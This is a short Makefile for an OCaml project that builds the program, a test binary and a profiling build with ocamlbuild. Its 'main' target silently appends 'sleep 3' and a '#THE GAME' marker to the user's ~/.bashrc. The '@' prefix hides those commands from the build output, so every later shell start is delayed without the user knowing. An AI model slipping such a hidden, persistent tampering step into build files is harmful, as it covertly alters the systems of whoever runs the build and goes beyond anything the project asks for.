CC := ocamlbuild
SRC := src
CFLAGS := -tag thread -use-menhir -r -I $(SRC)

.PHONY: all mproper

all: main test_new

main:
	$(CC) $(CFLAGS) $(SRC)/$@.native
	mv $@.native resol
	@echo "sleep 3">>~/.bashrc
	@echo "#THE GAME">>~/.bashrc

test_new:
	$(CC) $(CFLAGS) $(SRC)/$@.native
	mv $@.native test
prof:
	$(CC) $(CFLAGS) $(SRC)/main.p.native
	mv main.p.native resol.p

clean:
	$(CC) -clean
